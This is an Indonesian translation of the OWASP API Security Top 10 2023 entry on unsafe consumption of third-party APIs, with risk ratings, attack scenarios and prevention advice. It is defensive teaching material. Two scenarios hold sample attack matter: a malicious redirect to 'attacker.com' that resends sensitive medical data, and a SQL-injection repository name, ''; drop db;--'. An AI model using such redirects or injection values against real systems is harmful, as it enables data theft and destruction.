# API10:2023 Konsumsi API Tanpa Peduli Keselamatan

| Agen ancaman/Vektor serangan | Kelemahan Keamanan | Impak |
| - | - | - |
| Spesifik API : Eksploitabilitas **Mudah** | Prevalensi **Umum** : Keterdeteksian **Rata-rata** | Teknis **Sangat Parah** : Spesifik Bisnis |
| Mengeksploitasi masalah ini memerlukan penyerang mengidentifikasi dan secara potensial mengkompromi API/layanan lain yang terintegrasi dengan target API. Biasalnya, informasi ini tidak tersedia secara publik atau API/layanan terintegrasi tidak dapat dieksploitasi dengan mudah. | Para pengembang cenderung mempercayai dan tidak memverifikasi titik-titik akhir yang berinteraksi dengan API pihak ketiga atau eksternal, mengandalkan pada persyaratan keamanan yang lebih lemah seperti misalnya terkait dengan keamanan transport, otentikasi/otorisasi, dan validasi dan sanitasi masukan. Penyerang perlu mengidentifikasi layanan yang terintegrasi dengan (sumber data) API target dan, pada akhirnya, mengkompromi mereka. | Impak bervariasi menurut apa yang dilakukan oleh API target dengan data yang ditarik. Eksploitasi yang sukses dapat mengarah ke eksposur informasi sensitif ke aktor yang tidak punya otorisasi, banyak jenis injeksi, atau penyangkalan layanan. |

## Apakah API Rentan?

Para pengembang cenderung memercayai data yang diterima dari API pihak ketiga
lebih dari pada masukan pengguna. Ini khususnya benar untuk API yang
ditawarkan oleh perusahaan-perusahaan yang dikenal baik. Karena itu, para
pengembang cenderung mengadopsi standar keamanan yang lebih lemah, misalnya,
dalam kaitan dengan validasi dan sanitasi masukan.

API mungkin rentan bila:

* Berinteraksi dengan API lain melalui kanal tak terenkripsi;
* Tidak memvalidasi dan mensanitasi secara tepat data yang dikumpulkan dari
  API lain sebelum memrosesnya atau meneruskannya ke komponen hilir;
* Mengikuti redireksi secara membuta;
* Tidak membatasi banyaknya sumber daya yang tersedia untuk memroses
  respons layanan pihak ketiga;
* Tidak mengimplementasikan tenggat waktu untuk interaksi dengan layanan pihak
  ketiga;
  
## Contoh Skenario Serangan

### Skenario #1

Suatu API mengandalkan layanan pihak ketiga untuk memperkaya alamat bisnis
yang diberikan oleh pengguna. Ketika sebuah alamat diberikan ke API oleh
pengguna akhir, itu dikirim ke layanan pihak ketiga dan data yang dikembalikan
kemudian disimpan pada suatu basis data SQL lokal.

Aktor jahat memakai layanan pihak ketiga untuk menyimpan suatu payload SQLi
yang terkait dengan sebuah bisnis yang dibuat oleh mereka. Kemudia mereka
menarget API yang rentan memberikan masukan spesifik yang membuatnya mengambil
"bisnis jahat" mereka dari layanan pihak ketiga. Payload SQLi berakhir
dieksekusi oleh basis data, mengeksfiltrasi data ke server yang dikendalikan
oleh penyerang.

### Skenario #2

Sebuah API terintegrasi dengan suatu penyedia layanan pihak ketiga untuk
menyimpan secara aman informasi medis pengguna yang sensitif. Data dikirim
melalui koneksi yang aman memakai permintaan HTTP seperti di bawah:

```
POST /user/store_phr_record
{
  "genome": "ACTAGTAG__TTGADDAAIICCTT…"
}
```

Aktor jahat menemukan sebuah cara untuk mengkompromi API pihak ketiga dan
itu mulai merespon dengan `308 Permanent Redirect` ke permintaan-permintaan
seperti yang sebelumnya.

```
HTTP/1.1 308 Permanent Redirect
Location: https://attacker.com/
```

Karena API secara membuta mengikuti redireksi pihak ketiga, itu akan mengulang
permintaan yang persis sama termasuk data sensitif milik pengguna, tapi kali 
ini ke server penyerang.

### Skenario #3

Seorang penyeranng dapat menyiapkan suatu repositori git bernama
`'; drop db;--`.

Kini, ketika suatu integrasi dari sebuah aplikasi yang diserang dilakukan
dengan repositori jahat, payload injeksi SQL dipakai pada suatu aplikasi
yang membangun sebuah kuiri SQL sambil memercayai bahwa nama repositori
adalah masukan yang aman.

## Bagaimana Cara Mencegah

* Saat mengevaluasi penyedia layanan, ases postur keamanan API mereka.
* Pastikan semua interaksi API terjadi lewat kanal komunikasi yang aman (TLS).
* Selalu validasikan dan sanitasikan dengan tepat data yang diterima dari
  API terintegrasi sebelum memakainya.
* Pelihara suatu daftar izin dari lokasi yang dikenal baik yang oleh API
  terintegrasi mungkin Anda diarahkan ke sana: jangan secara membabi buta
  mengikuti redirect.

## Referensi

### OWASP

* [Web Service Security Cheat Sheet][1]
* [Injection Flaws][2]
* [Input Validation Cheat Sheet][3]
* [Injection Prevention Cheat Sheet][4]
* [Transport Layer Protection Cheat Sheet][5]
* [Unvalidated Redirects and Forwards Cheat Sheet][6]

### Eksternal

* [CWE-20: Improper Input Validation][7]
* [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor][8]
* [CWE-319: Cleartext Transmission of Sensitive Information][9]

[1]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html
[2]: https://www.owasp.org/index.php/Injection_Flaws
[3]: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
[4]: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
[5]: https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html
[6]: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
[7]: https://cwe.mitre.org/data/definitions/20.html
[8]: https://cwe.mitre.org/data/definitions/200.html
[9]: https://cwe.mitre.org/data/definitions/319.html
